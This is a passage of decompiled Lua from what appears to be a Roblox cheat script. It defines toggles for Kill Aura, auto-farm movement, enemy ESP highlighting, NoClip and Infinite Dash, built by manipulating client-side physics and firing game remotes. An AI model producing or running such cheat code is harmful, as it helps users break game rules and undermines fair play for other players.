                                                ipairs_4 = nil
                                            end
                                            name_3 = 0.0
                                            if name_2 ~= nil then
                                                get_pivot_3 = name_2.Z
                                            else
                                                get_pivot_3 = nil
                                            end
                                            basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                            get_pivot_2 = (get_pivot_2) - (basehitbox)
                                            if get_pivot_2 ~= nil then
                                                get_pivot_2 = get_pivot_2.Magnitude
                                            else
                                                get_pivot_2 = nil
                                            end
                                            if (30.0 < get_pivot_2) then
                                                basehitbox = capture_1_156176.value
                                                ipairs_4 = Vector3.new
                                                name_3 = 0.0
                                                get_pivot_3 = 5.0
                                                ipairs_4_result = 0.0
                                                ipairs_4 = ipairs_4(name_3, get_pivot_3, ipairs_4_result)
                                                ipairs_4 = (name_2) + (ipairs_4)
                                                basehitbox = basehitbox(ipairs_4)
                                                health_4 = basehitbox
                                            else
                                                basehitbox = (tick()) * (12.0)
                                                ipairs_4 = 12.0
                                                name_3 = 22.0
                                                get_pivot_3 = Vector3.new
                                                ipairs_4_result = math
                                                if ipairs_4_result ~= nil then
                                                    ipairs_4_result = ipairs_4_result.cos
                                                else
                                                    ipairs_4_result = nil
                                                end
                                                ipairs_4_result = (ipairs_4_result(basehitbox)) * (ipairs_4)
                                                val_180 = name_3
                                                magnitude = math
                                                if magnitude ~= nil then
                                                    magnitude = magnitude.sin
                                                else
                                                    magnitude = nil
                                                end
                                                val_181 = basehitbox
                                                magnitude = (magnitude(val_181)) * (ipairs_4)
                                                get_pivot_3 = get_pivot_3(ipairs_4_result, val_180, magnitude)
                                                health_4 = (name_2) + (get_pivot_3)
                                                ipairs_3 = 120.0
                                            end
                                        else
                                            if korth_result then
                                                name_2 = capture_1_156176.value
                                                get_pivot_2 = vaultTarget
                                                basehitbox = get_pivot_2
                                                if get_pivot_2 then
                                                    get_pivot_2 = get_pivot_2.GetPivot
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                get_pivot_2 = get_pivot_2(basehitbox)
                                                if get_pivot_2 ~= nil then
                                                    get_pivot_2 = get_pivot_2.Position
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                name_2 = name_2(get_pivot_2)
                                                health_4 = name_2
                                            else
                                                name_2 = capture_1_156176.value
                                                get_pivot_2 = vaultTarget
                                                basehitbox = get_pivot_2
                                                if get_pivot_2 then
                                                    get_pivot_2 = get_pivot_2.GetPivot
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                get_pivot_2 = get_pivot_2(basehitbox)
                                                if get_pivot_2 ~= nil then
                                                    get_pivot_2 = get_pivot_2.Position
                                                else
                                                    get_pivot_2 = nil
                                                end
                                                basehitbox = Vector3.new
                                                ipairs_4 = 0.0
                                                name_3 = 5.0
                                                get_pivot_3 = 0.0
                                                basehitbox = basehitbox(ipairs_4, name_3, get_pivot_3)
                                                get_pivot_2 = (get_pivot_2) + (basehitbox)
                                                name_2 = name_2(get_pivot_2)
                                                health_4 = name_2
                                            end
                                        end
                                    end
                                    name_2 = capture_1_156162.value
                                    if name_2 ~= nil then
                                        name_2 = name_2.Position
                                    else
                                        name_2 = nil
                                    end
                                    name_2 = (health_4) - (name_2)
                                    if name_2 ~= nil then
                                        name_2 = name_2.Unit
                                    else
                                        name_2 = nil
                                    end
                                    get_pivot_2 = capture_1_156162.value
                                    if get_pivot_2 ~= nil then
                                        get_pivot_2 = get_pivot_2.Position
                                    else
                                        get_pivot_2 = nil
                                    end
                                    get_pivot_2 = (health_4) - (get_pivot_2)
                                    if get_pivot_2 ~= nil then
                                        get_pivot_2 = get_pivot_2.Magnitude
                                    else
                                        get_pivot_2 = nil
                                    end
                                    if (2.0 < get_pivot_2) then
                                        basehitbox = (name_2) * (ipairs_3)
                                        if korth then
                                            korth.Velocity = basehitbox
                                        end
                                    else
                                        basehitbox = Vector3.zero
                                        if korth then
                                            korth.Velocity = basehitbox
                                        end
                                    end
                                    basehitbox = capture_1_156163.value
                                    if basehitbox then
                                        basehitbox.PlatformStand = true
                                    end
                                    if korth_result then
                                        basehitbox = pcall
                                        local capture_77_186113_2, capture_77_186114_2 = val_173, val_174
                                        ipairs_4 = function()
                                            local activate_4, tool_6
                                            local fire_server_12 = capture_77_186113_2.value
                                            if fire_server_12 then
                                                fire_server_12 = capture_77_186113_2.value
                                                activate_4 = fire_server_12
                                                if fire_server_12 then
                                                    fire_server_12 = fire_server_12.FireServer
                                                else
                                                    fire_server_12 = nil
                                                end
                                                fire_server_12(activate_4)
                                            end
                                            fire_server_12 = capture_77_186114_2.value
                                            if fire_server_12 then
                                                fire_server_12 = capture_77_186114_2.value
                                                activate_4 = fire_server_12
                                                if fire_server_12 then
                                                    fire_server_12 = fire_server_12.FindFirstChildOfClass
                                                else
                                                    fire_server_12 = nil
                                                end
                                                tool_6 = "Tool"
                                                fire_server_12 = fire_server_12(activate_4, tool_6)
                                            end
                                            if fire_server_12 then
                                                tool_6 = fire_server_12
                                                if fire_server_12 then
                                                    activate_4 = fire_server_12.Activate
                                                else
                                                    activate_4 = nil
                                                end
                                                activate_4(tool_6)
                                            end
                                            return
                                        end
                                        basehitbox(ipairs_4)
                                    else
                                        basehitbox = vaultTarget
                                        if basehitbox then
                                            basehitbox = vaultTarget
                                            ipairs_4 = basehitbox
                                            if basehitbox then
                                                basehitbox = basehitbox.FindFirstChildOfClass
                                            else
                                                basehitbox = nil
                                            end
                                            name_3 = "Humanoid"
                                            basehitbox = basehitbox(ipairs_4, name_3)
                                            if basehitbox then
                                                basehitbox = val_175
                                                basehitbox()
                                            end
                                        end
                                    end
                                end
                            end
                        else
                            auto_farm = capture_1_156162.value
                            if auto_farm then
                                auto_farm = capture_1_156162.value
                                value_19 = auto_farm
                                if auto_farm then
                                    auto_farm = auto_farm.FindFirstChild
                                else
                                    auto_farm = nil
                                end
                                in_cutscene_2 = "BV"
                                auto_farm = auto_farm(value_19, in_cutscene_2)
                                if auto_farm then
                                    in_cutscene_2 = auto_farm
                                    if auto_farm then
                                        value_19 = auto_farm.Destroy
                                    else
                                        value_19 = nil
                                    end
                                    value_19(in_cutscene_2)
                                end
                            end
                            auto_farm = capture_1_156163.value
                            if auto_farm then
                                auto_farm = capture_1_156163.value
                                if auto_farm then
                                    auto_farm.PlatformStand = false
                                end
                            end
                        end
                    else
                        auto_farm = capture_1_156162.value
                        if auto_farm then
                            auto_farm = capture_1_156162.value
                            value_19 = auto_farm
                            if auto_farm then
                                auto_farm = auto_farm.FindFirstChild
                            else
                                auto_farm = nil
                            end
                            in_cutscene_2 = "BV"
                            auto_farm = auto_farm(value_19, in_cutscene_2)
                            if auto_farm then
                                in_cutscene_2 = auto_farm
                                if auto_farm then
                                    value_19 = auto_farm.Destroy
                                else
                                    value_19 = nil
                                end
                                value_19(in_cutscene_2)
                            end
                        end
                        auto_farm = capture_1_156163.value
                        if auto_farm then
                            auto_farm = capture_1_156163.value
                            if auto_farm then
                                auto_farm.PlatformStand = false
                            end
                        end
                    end
                else
                    auto_farm = capture_1_156162.value
                    if auto_farm then
                        auto_farm = capture_1_156162.value
                        value_19 = auto_farm
                        if auto_farm then
                            auto_farm = auto_farm.FindFirstChild
                        else
                            auto_farm = nil
                        end
                        in_cutscene_2 = "BV"
                        auto_farm = auto_farm(value_19, in_cutscene_2)
                        if auto_farm then
                            in_cutscene_2 = auto_farm
                            if auto_farm then
                                value_19 = auto_farm.Destroy
                            else
                                value_19 = nil
                            end
                            value_19(in_cutscene_2)
                        end
                    end
                    auto_farm = capture_1_156163.value
                    if auto_farm then
                        auto_farm = capture_1_156163.value
                        if auto_farm then
                            auto_farm.PlatformStand = false
                        end
                    end
                end
            end
        end
    end
    tbl_35.value(handler_14)
    tbl_36.value = "AddToggle"
    handler_14 = handler_12
    if handler_12 then
        tbl_35.value = handler_12[tbl_36.value]
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Kill Aura")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    handler_result_2 = false
    if tbl_36.value then
        tbl_36.value.Default = handler_result_2
    end
    if tbl_36.value then
        tbl_36.value.Flag = "Aura"
    end
    do
        local val_182 = tbl_3
        handler_result_2 = function(argument_1)
            local val_183 = val_182
            if val_183 then
                val_183.Aura = argument_1
            end
            return
        end
    end
    if tbl_36.value then
        tbl_36.value.Callback = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    tbl_36.value = "AddSlider"
    handler_14 = handler_12
    if handler_12 then
        tbl_35.value = handler_12[tbl_36.value]
    else
        tbl_35.value = nil
    end
    tbl_36.value = {}
    handler_result_2 = handler("Aura Radius")
    if tbl_36.value then
        tbl_36.value.Name = handler_result_2
    end
    if tbl_36.value then
        tbl_36.value.Min = 20.0
    end
    if tbl_36.value then
        tbl_36.value.Max = 200.0
    end
    if tbl_36.value then
        tbl_36.value.Default = 100.0
    end
    if tbl_36.value then
        tbl_36.value.Increment = 1.0
    end
    handler_result_2 = "ValueName"
    handler_result_3 = handler("Range")
    if tbl_36.value then
        tbl_36.value[handler_result_2] = handler_result_3
    end
    if tbl_36.value then
        tbl_36.value.Flag = "AuraRadius"
    end
    do
        local val_184, val_185 = tbl_3, tween_service
        handler_result_2 = function(argument_1)
            local play, val_186, new_3, tbl_54, easing_style, easing_direction, val_187, val_188
            local create = val_184
            if create then
                create.AuraRadius = argument_1
            end
            create = auraCircle
            if create then
                create = val_185
                play = create
                if create then
                    create = create.Create
                else
                    create = nil
                end
                val_186 = auraCircle
                new_3 = TweenInfo.new
                tbl_54 = 0.2
                easing_style = Enum.EasingStyle
                if easing_style ~= nil then
                    easing_style = easing_style.Quad
                else
                    easing_style = nil
                end
                easing_direction = Enum.EasingDirection
                if easing_direction ~= nil then
                    easing_direction = easing_direction.Out
                else
                    easing_direction = nil
                end
                new_3 = new_3(tbl_54, easing_style, easing_direction)
                tbl_54 = {}
                easing_style = Vector3.new
                easing_direction = 0.2
                val_187 = (argument_1) * (2.0)
                val_188 = (argument_1) * (2.0)
                tbl_54.Size = easing_style(easing_direction, val_187, val_188)
                create = create(play, val_186, new_3, tbl_54)
                val_186 = create
                if create then
                    play = create.Play
                else
                    play = nil
                end
                play(val_186)
            end
            return
        end
    end
    if tbl_36.value then
        tbl_36.value.Callback = handler_result_2
    end
    tbl_35.value(handler_14, tbl_36.value)
    tbl_35.value = nil
    do
        local capture_1_173569, val_189 = tbl_35, tbl_3
        handler_14 = function()
            local part_type
            local destroy = capture_1_173569.value
            if destroy then
                destroy = capture_1_173569.value
                part_type = destroy
                if destroy then
                    destroy = destroy.Destroy
                else
                    destroy = nil
                end
                destroy(part_type)
            end
            capture_1_173569.value = (Instance.new)("Part")
            destroy = capture_1_173569.value
            if destroy then
                destroy.Name = "AuraCircle"
            end
            destroy = capture_1_173569.value
            part_type = Enum.PartType
            if part_type ~= nil then
                part_type = part_type.Cylinder
            else
                part_type = nil
            end
            if destroy then
                destroy.Shape = part_type
            end
            destroy = capture_1_173569.value
            part_type = Vector3.new
            local aura_radius_2 = val_189
            if aura_radius_2 ~= nil then
                aura_radius_2 = aura_radius_2.AuraRadius
            else
                aura_radius_2 = nil
            end
            aura_radius_2 = (aura_radius_2) * (2.0)
            local aura_radius_3 = val_189
            if aura_radius_3 ~= nil then
                aura_radius_3 = aura_radius_3.AuraRadius
            else
                aura_radius_3 = nil
            end
            aura_radius_3 = (aura_radius_3) * (2.0)
            part_type = part_type(0.2, aura_radius_2, aura_radius_3)
            if destroy then
                destroy.Size = part_type
            end
            destroy = capture_1_173569.value
            part_type = (Color3.fromRGB)(255.0, 0.0, 0.0)
            if destroy then
                destroy.Color = part_type
            end
            destroy = capture_1_173569.value
            part_type = Enum.Material
            if part_type ~= nil then
                part_type = part_type.Neon
            else
                part_type = nil
            end
            if destroy then
                destroy.Material = part_type
            end
            destroy = capture_1_173569.value
            if destroy then
                destroy.Transparency = 0.5
            end
            destroy = capture_1_173569.value
            if destroy then
                destroy.Anchored = true
            end
            destroy = capture_1_173569.value
            if destroy then
                destroy.CanCollide = false
            end
            destroy = capture_1_173569.value
            part_type = workspace
            if destroy then
                destroy.Parent = part_type
            end
            return
        end
    end
    do
        local capture_1_174337 = tbl_35
        tbl_36.value = function()
            local val_190
            local destroy_2 = capture_1_174337.value
            if destroy_2 then
                destroy_2 = capture_1_174337.value
                val_190 = destroy_2
                if destroy_2 then
                    destroy_2 = destroy_2.Destroy
                else
                    destroy_2 = nil
                end
                destroy_2(val_190)
                destroy_2 = nil
                capture_1_174337.value = destroy_2
            end
            return
        end
    end
    handler_result_2 = RunService
    if handler_result_2 ~= nil then
        handler_result_2 = handler_result_2.RenderStepped
    else
        handler_result_2 = nil
    end
    connect = "Connect"
    handler_result_3 = handler_result_2
    if handler_result_2 then
        handler_result_2 = handler_result_2[connect]
    else
        handler_result_2 = nil
    end
    do
        local capture_1_176897, capture_1_176898, val_191 = tbl_35, tbl_10, tbl_3
        connect = function()
            local pack_result_68
            local cframe, angles, aura_radius_4, aura_radius_5, math_7, pack_result_69
            local val_192 = capture_1_176897.value
            if val_192 then
                val_192 = capture_1_176898.value
                if val_192 then
                    val_192 = capture_1_176897.value
                    cframe = capture_1_176898.value
                    if cframe ~= nil then
                        cframe = cframe.CFrame
                    else
                        cframe = nil
                    end
                    angles = CFrame.Angles
                    aura_radius_4 = 0.0
                    aura_radius_5 = 0.0
                    math_7 = math
                    if math_7 ~= nil then
                        math_7 = math_7.rad
                    else
                        math_7 = nil
                    end
                    pack_result_68 = pack(math_7(90.0))
                    if pack_result_68.n >= 1 then
                        math_7 = pack_result_68[1]
                    end
                    if pack_result_68.n >= 2 then
                        pack_result_69 = pack_result_68[2]
                    end
                    angles = angles(aura_radius_4, aura_radius_5, unpack(pack_result_68, 1, pack_result_68.n))
                    cframe = (cframe) * (angles)
                    if val_192 then
                        val_192.CFrame = cframe
                    end
                    val_192 = capture_1_176897.value
                    cframe = Vector3.new
                    angles = 0.2
                    aura_radius_4 = val_191
                    if aura_radius_4 ~= nil then
                        aura_radius_4 = aura_radius_4.AuraRadius
                    else
                        aura_radius_4 = nil
                    end
                    aura_radius_4 = (aura_radius_4) * (2.0)
                    aura_radius_5 = val_191
                    if aura_radius_5 ~= nil then
                        aura_radius_5 = aura_radius_5.AuraRadius
                    else
                        aura_radius_5 = nil
                    end
                    aura_radius_5 = (aura_radius_5) * (2.0)
                    cframe = cframe(angles, aura_radius_4, aura_radius_5)
                    if val_192 then
                        val_192.Size = cframe
                    end
                end
            end
            return
        end
    end
    handler_result_2(handler_result_3, connect)
    handler_result_2 = task.spawn
    do
        local val_193, val_194, val_195 = run_service, tbl_3, tbl_9
        handler_result_3 = function()
            local stepped = val_193
            if stepped ~= nil then
                stepped = stepped.Stepped
            else
                stepped = nil
            end
            local val_196 = stepped
            if stepped then
                stepped = stepped.Connect
            else
                stepped = nil
            end
            local val_197, capture_84_1026_2 = val_194, val_195
            stepped(val_196, function()
                local pack_result_70
                local get_descendants_2, val_198, local_1_result_5, val_199, is_a_5, val_200, base_part
                local no_clip = val_197
                if no_clip ~= nil then
                    no_clip = no_clip.NoClip
                else
                    no_clip = nil
                end
                if not no_clip then
                    no_clip = val_197
                    if no_clip ~= nil then
                        no_clip = no_clip.AutoFarm
                    else
                        no_clip = nil
                    end
                    if no_clip then
                        no_clip = capture_84_1026_2.value
                        if no_clip then
                            no_clip = pairs
                            get_descendants_2 = capture_84_1026_2.value
                            val_198 = get_descendants_2
                            if get_descendants_2 then
                                get_descendants_2 = get_descendants_2.GetDescendants
                            else
                                get_descendants_2 = nil
                            end
                            pack_result_70 = pack(get_descendants_2(val_198))
                            if pack_result_70.n >= 1 then
                                get_descendants_2 = pack_result_70[1]
                            end
                            if pack_result_70.n >= 2 then
                                val_198 = pack_result_70[2]
                            end
                            if pack_result_70.n >= 3 then
                                local_1_result_5 = pack_result_70[3]
                            end
                            if pack_result_70.n >= 4 then
                                val_199 = pack_result_70[4]
                            end
                            if pack_result_70.n >= 5 then
                                is_a_5 = pack_result_70[5]
                            end
                            if pack_result_70.n >= 6 then
                                val_200 = pack_result_70[6]
                            end
                            if pack_result_70.n >= 7 then
                                base_part = pack_result_70[7]
                            end
                            no_clip = no_clip(unpack(pack_result_70, 1, pack_result_70.n))
                            while true do
                                local_1_result_5 = no_clip(get_descendants_2, val_198)
                                if local_1_result_5 ~= nil then
                                    val_198 = local_1_result_5
                                    val_200 = val_199
                                    if val_199 then
                                        is_a_5 = val_199.IsA
                                    else
                                        is_a_5 = nil
                                    end
                                    base_part = "BasePart"
                                    is_a_5 = is_a_5(val_200, base_part)
                                    if is_a_5 then
                                        if val_199 ~= nil then
                                            is_a_5 = val_199.CanCollide
                                        else
                                            is_a_5 = nil
                                        end
                                        if is_a_5 then
                                            if val_199 then
                                                val_199.CanCollide = false
                                            end
                                        end
                                    end
                                else
                                    break
                                end
                            end
                        end
                    end
                else
                    no_clip = capture_84_1026_2.value
                    if no_clip then
                        no_clip = pairs
                        get_descendants_2 = capture_84_1026_2.value
                        val_198 = get_descendants_2
                        if get_descendants_2 then
                            get_descendants_2 = get_descendants_2.GetDescendants
                        else
                            get_descendants_2 = nil
                        end
                        pack_result_70 = pack(get_descendants_2(val_198))
                        if pack_result_70.n >= 1 then
                            get_descendants_2 = pack_result_70[1]
                        end
                        if pack_result_70.n >= 2 then
                            val_198 = pack_result_70[2]
                        end
                        if pack_result_70.n >= 3 then
                            local_1_result_5 = pack_result_70[3]
                        end
                        if pack_result_70.n >= 4 then
                            val_199 = pack_result_70[4]
                        end
                        if pack_result_70.n >= 5 then
                            is_a_5 = pack_result_70[5]
                        end
                        if pack_result_70.n >= 6 then
                            val_200 = pack_result_70[6]
                        end
                        if pack_result_70.n >= 7 then
                            base_part = pack_result_70[7]
                        end
                        no_clip = no_clip(unpack(pack_result_70, 1, pack_result_70.n))
                        while true do
                            local_1_result_5 = no_clip(get_descendants_2, val_198)
                            if local_1_result_5 ~= nil then
                                val_198 = local_1_result_5
                                val_200 = val_199
                                if val_199 then
                                    is_a_5 = val_199.IsA
                                else
                                    is_a_5 = nil
                                end
                                base_part = "BasePart"
                                is_a_5 = is_a_5(val_200, base_part)
                                if is_a_5 then
                                    if val_199 ~= nil then
                                        is_a_5 = val_199.CanCollide
                                    else
                                        is_a_5 = nil
                                    end
                                    if is_a_5 then
                                        if val_199 then
                                            val_199.CanCollide = false
                                        end
                                    end
                                end
                            else
                                break
                            end
                        end
                    end
                end
                return
            end)
            return
        end
    end
    handler_result_2(handler_result_3)
    connect = "AddToggle"
    handler_result_3 = handler_12
    if handler_12 then
        handler_result_2 = handler_12[connect]
    else
        handler_result_2 = nil
    end
    connect = {}
    connect.Name = handler("Show Aura Radius")
    connect.Default = false
    show_aura = "ShowAura"
    connect.Flag = show_aura
    do
        local val_201, capture_1_182786 = handler_14, tbl_36
        show_aura = function(argument_1)
            local val_202
            if argument_1 then
                val_202 = val_201
                val_202()
            else
                val_202 = capture_1_182786.value
                val_202()
            end
            return
        end
    end
    connect.Callback = show_aura
    handler_result_2(handler_result_3, connect)
    handler_result_2 = {}
    do
        local val_203 = handler_4
        handler_result_3 = function(argument_1)
            return val_203(argument_1)
        end
    end
    do
        local val_204 = handler_result_2
        connect = function(argument_1)
            local parent_2, highlight_depth_mode
            if argument_1 then
                if argument_1 ~= nil then
                    parent_2 = argument_1.Parent
                else
                    parent_2 = nil
                end
                if parent_2 then
                    parent_2 = val_204
                    if parent_2 ~= nil then
                        parent_2 = parent_2[argument_1]
                    else
                        parent_2 = nil
                    end
                    if parent_2 then
                        return
                    else
                        parent_2 = (Instance.new)("Highlight")
                        if parent_2 then
                            parent_2.Name = "ESP_Highlight"
                        end
                        highlight_depth_mode = (Color3.fromRGB)(255.0, 0.0, 0.0)
                        if parent_2 then
                            parent_2.FillColor = highlight_depth_mode
                        end
                        if parent_2 then
                            parent_2.FillTransparency = 0.5
                        end
                        highlight_depth_mode = (Color3.fromRGB)(255.0, 255.0, 255.0)
                        if parent_2 then
                            parent_2.OutlineColor = highlight_depth_mode
                        end
                        if parent_2 then
                            parent_2.OutlineTransparency = 0.0
                        end
                        highlight_depth_mode = Enum.HighlightDepthMode
                        if highlight_depth_mode ~= nil then
                            highlight_depth_mode = highlight_depth_mode.AlwaysOnTop
                        else
                            highlight_depth_mode = nil
                        end
                        if parent_2 then
                            parent_2.DepthMode = highlight_depth_mode
                        end
                        if parent_2 then
                            parent_2.Adornee = argument_1
                        end
                        if parent_2 then
                            parent_2.Parent = argument_1
                        end
                        highlight_depth_mode = val_204
                        if highlight_depth_mode then
                            highlight_depth_mode[argument_1] = parent_2
                        end
                        return
                    end
                end
                return
            end
            return
        end
    end
    do
        local val_205 = handler_result_2
        show_aura = function(argument_1)
            local destroy_3, val_206
            local val_207 = val_205
            if val_207 ~= nil then
                val_207 = val_207[argument_1]
            else
                val_207 = nil
            end
            if val_207 then
                val_206 = val_207
                if val_207 then
                    destroy_3 = val_207.Destroy
                else
                    destroy_3 = nil
                end
                destroy_3(val_206)
                destroy_3 = val_205
                if destroy_3 then
                    destroy_3[argument_1] = nil
                end
            end
            return
        end
    end
    spawn_3 = task.spawn
    do
        local val_208, val_209, val_210, val_211, val_212, val_213 = tbl_3, workspace_2, handler_result_3, connect, show_aura, handler_result_2
        handler_15 = function()
            local pack_result_71
            local wait_6, get_children_4, pack_result_72, pack_result_73, pack_result_74, pack_result_75, pack_result_76, pack_result_77
            while true do
                wait_6 = task.wait
                get_children_4 = 0.5
                wait_6(get_children_4)
                wait_6 = val_208
                if wait_6 ~= nil then
                    wait_6 = wait_6.ESP
                else
                    wait_6 = nil
                end
                if wait_6 then
                    wait_6 = ipairs
                    get_children_4 = val_209
                    pack_result_72 = get_children_4
                    if get_children_4 then
                        get_children_4 = get_children_4.GetChildren
                    else
                        get_children_4 = nil
                    end
                    pack_result_71 = pack(get_children_4(pack_result_72))
                    if pack_result_71.n >= 1 then
                        get_children_4 = pack_result_71[1]
                    end
                    if pack_result_71.n >= 2 then
                        pack_result_72 = pack_result_71[2]
                    end
                    if pack_result_71.n >= 3 then
                        pack_result_73 = pack_result_71[3]
                    end
                    if pack_result_71.n >= 4 then
                        pack_result_74 = pack_result_71[4]
                    end
                    if pack_result_71.n >= 5 then
                        pack_result_75 = pack_result_71[5]
                    end
                    if pack_result_71.n >= 6 then
                        pack_result_76 = pack_result_71[6]
                    end
                    if pack_result_71.n >= 7 then
                        pack_result_77 = pack_result_71[7]
                    end
                    wait_6 = wait_6(unpack(pack_result_71, 1, pack_result_71.n))
                    while true do
                        pack_result_73 = wait_6(get_children_4, pack_result_72)
                        if pack_result_73 ~= nil then
                            pack_result_72 = pack_result_73
                            pack_result_76 = pack_result_74
                            if pack_result_74 then
                                pack_result_75 = pack_result_74.IsA
                            else
                                pack_result_75 = nil
                            end
                            pack_result_77 = "Model"
                            pack_result_75 = pack_result_75(pack_result_76, pack_result_77)
                            if pack_result_75 then
                                pack_result_75 = val_210
                                pack_result_76 = pack_result_74
                                pack_result_75 = pack_result_75(pack_result_76)
                                if pack_result_75 then
                                    pack_result_75 = val_211
                                    pack_result_76 = pack_result_74
                                    pack_result_75(pack_result_76)
                                else
                                    pack_result_75 = val_212
                                    pack_result_76 = pack_result_74
                                    pack_result_75(pack_result_76)
                                end
                            end
                        else
                            break
                        end
                    end
                    wait_6 = pairs
                    get_children_4 = val_213
                    wait_6 = wait_6(get_children_4)
                    while true do
                        pack_result_73 = wait_6(get_children_4, pack_result_72)
                        if pack_result_73 ~= nil then
                            pack_result_72 = pack_result_73
                            if pack_result_73 ~= nil then
                                pack_result_74 = pack_result_73.Parent
                            else
                                pack_result_74 = nil
                            end
                            if pack_result_74 then
                                pack_result_74 = val_210
                                pack_result_75 = pack_result_73
                                pack_result_74 = pack_result_74(pack_result_75)
                                if not pack_result_74 then
                                    pack_result_74 = val_212
                                    pack_result_75 = pack_result_73
                                    pack_result_74(pack_result_75)
                                end
                            else
                                pack_result_74 = val_212
                                pack_result_75 = pack_result_73
                                pack_result_74(pack_result_75)
                            end
                        else
                            break
                        end
                    end
                else
                    wait_6 = pairs
                    get_children_4 = val_213
                    wait_6 = wait_6(get_children_4)
                    while true do
                        pack_result_73 = wait_6(get_children_4, pack_result_72)
                        if pack_result_73 ~= nil then
                            pack_result_72 = pack_result_73
                            pack_result_74 = val_212
                            pack_result_75 = pack_result_73
                            pack_result_74(pack_result_75)
                        else
                            break
                        end
                    end
                end
            end
        end
    end
    spawn_3(handler_15)
    add_toggle = "AddToggle"
    handler_15 = handler_12
    if handler_12 then
        spawn_3 = handler_12[add_toggle]
    else
        spawn_3 = nil
    end
    add_toggle = {}
    add_toggle.Name = handler("ESP Enemies")
    handler_16 = false
    add_toggle.Default = handler_16
    add_toggle.Flag = "ESP"
    do
        local val_214, val_215, val_216 = tbl_3, handler_result_2, show_aura
        handler_16 = function(argument_1)
            local val_217, local_2_result_9, local_2_result_10, val_218, local_2_result_11
            local pairs_12 = val_214
            if pairs_12 then
                pairs_12.ESP = argument_1
            end
            if not argument_1 then
                pairs_12 = pairs
                val_217 = val_215
                pairs_12 = pairs_12(val_217)
                while true do
                    local_2_result_10 = pairs_12(val_217, local_2_result_9)
                    if local_2_result_10 ~= nil then
                        local_2_result_9 = local_2_result_10
                        val_218 = val_216
                        local_2_result_11 = local_2_result_10
                        val_218(local_2_result_11)
                    else
                        break
                    end
                end
            end
            return
        end
    end
    add_toggle.Callback = handler_16
    spawn_3(handler_15, add_toggle)
    handler_15 = handler_12
    if handler_12 then
        spawn_3 = handler_12.AddSection
    else
        spawn_3 = nil
    end
    add_toggle = {}
    add_toggle.Name = handler("Player")
    spawn_3(handler_15, add_toggle)
    add_toggle = "AddToggle"
    handler_15 = handler_12
    if handler_12 then
        spawn_3 = handler_12[add_toggle]
    else
        spawn_3 = nil
    end
    add_toggle = {}
    add_toggle.Name = handler("Infinite Dash")
    handler_16 = false
    add_toggle.Default = handler_16
    add_toggle.Flag = "InfDashForce"
    do
        local val_219 = tbl_3
        handler_16 = function(argument_1)
            local val_220 = val_219
            if val_220 then
                val_220.InfDashForce = argument_1
            end
            return
        end
    end
    add_toggle.Callback = handler_16
    spawn_3(handler_15, add_toggle)
    add_toggle = "AddToggle"
    handler_15 = handler_12
    if handler_12 then
        spawn_3 = handler_12[add_toggle]
    else
        spawn_3 = nil
    end
    add_toggle = {}
    add_toggle.Name = handler("NoClip")
    handler_16 = false
    add_toggle.Default = handler_16
    add_toggle.Flag = "NoClip"
    do
        local val_221 = tbl_3
        handler_16 = function(argument_1)
            local val_222 = val_221
            if val_222 then
                val_222.NoClip = argument_1
            end
            return
        end
    end
    add_toggle.Callback = handler_16
    spawn_3(handler_15, add_toggle)
    tbl_21 = {
        value = tbl_21.value,
    }
    tbl_22 = {
        value = tbl_22.value,
    }
    tbl_23 = {
        value = tbl_23.value,
    }
    tbl_24 = {
        value = tbl_24.value,
    }
    tbl_25 = {
        value = tbl_25.value,
    }
    tbl_26 = {
        value = tbl_26.value,
    }
    tbl_27 = {
        value = tbl_27.value,
    }
    tbl_28 = {
        value = tbl_28.value,
    }
    tbl_29 = {
        value = tbl_29.value,
    }
    tbl_30 = {
        value = tbl_30.value,
    }
    tbl_31 = {
        value = tbl_31.value,
    }
    tbl_32 = {
        value = tbl_32.value,
    }
    tbl_33 = {
        value = tbl_33.value,
    }
    tbl_34 = {
        value = tbl_34.value,
    }
    tbl_35 = {
        value = tbl_35.value,
    }
    tbl_36 = {
        value = tbl_36.value,
    }
    tbl_21.value = game
    tbl_22.value = tbl_21.value
    if tbl_21.value then
        tbl_21.value = tbl_21.value.GetService
    else
        tbl_21.value = nil
    end
    tbl_23.value = "UserInputService"
    tbl_21.value = tbl_21.value(tbl_22.value, tbl_23.value)
    tbl_22.value = game
    tbl_23.value = tbl_22.value
    if tbl_22.value then
        tbl_22.value = tbl_22.value.GetService
    else
        tbl_22.value = nil
    end
    tbl_24.value = "Debris"
    tbl_22.value = tbl_22.value(tbl_23.value, tbl_24.value)
    tbl_23.value = game
    tbl_24.value = tbl_23.value
    if tbl_23.value then
        tbl_23.value = tbl_23.value.GetService
    else
        tbl_23.value = nil
    end
    tbl_25.value = "ReplicatedStorage"
    tbl_23.value = tbl_23.value(tbl_24.value, tbl_25.value)
    tbl_24.value = game
    if tbl_24.value ~= nil then
        tbl_24.value = tbl_24.value.Players
    else
        tbl_24.value = nil
    end
    if tbl_24.value ~= nil then
        tbl_24.value = tbl_24.value.LocalPlayer
    else
        tbl_24.value = nil
    end
    do
        local capture_1_205569, capture_1_205570, val_223, capture_1_205572 = tbl_10, tbl_11, tbl_23, tbl_22
        tbl_25.value = function()
            local material, unit, magnitude_2, new_4, armor_stats, pcall_9, new_5, math_8, math_9, math_10
            local floor_material = capture_1_205569.value
            if floor_material then
                floor_material = capture_1_205570.value
                if not floor_material then
                    return
                else
                    floor_material = capture_1_205570.value
                    if floor_material ~= nil then
                        floor_material = floor_material.FloorMaterial
                    else
                        floor_material = nil
                    end
                    material = Enum.Material
                    if material ~= nil then
                        material = material.Air
                    else
                        material = nil
                    end
                    if floor_material ~= material then
                        floor_material = false
                    else
                        floor_material = true
                    end
                    material = capture_1_205570.value
                    if material ~= nil then
                        material = material.MoveDirection
                    else
                        material = nil
                    end
                    unit = nil
                    if material ~= nil then
                        magnitude_2 = material.Magnitude
                    else
                        magnitude_2 = nil
                    end
                    if (magnitude_2 == 0.0) then
                        magnitude_2 = capture_1_205569.value
                        if magnitude_2 ~= nil then
                            magnitude_2 = magnitude_2.CFrame
                        else
                            magnitude_2 = nil
                        end
                        if magnitude_2 ~= nil then
                            magnitude_2 = magnitude_2.LookVector
                        else
                            magnitude_2 = nil
                        end
                        new_4 = Vector3.new
                        armor_stats = 1.0
